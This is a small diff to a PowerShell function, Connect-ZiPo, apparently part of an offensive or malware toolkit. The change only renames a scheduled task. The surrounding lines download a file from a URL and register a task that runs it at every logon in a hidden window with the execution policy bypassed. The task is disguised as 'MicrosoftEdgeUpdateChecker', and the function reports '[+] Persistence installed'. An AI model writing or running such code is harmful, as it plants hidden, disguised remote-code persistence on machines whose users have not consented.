@@ -23,7 +23,7 @@ function Connect-ZiPo {
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
         # Создание задачи
-        $taskName = "MicrosoftEdgeUpdateChecker"
+        $taskName = "MicrosoftEdgeUpdateChecker1"
         schtasks /Create /SC ONLOGON /TN $taskName /TR "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" /F | Out-Null
 
         return "[+] Persistence installed to $targetPath"
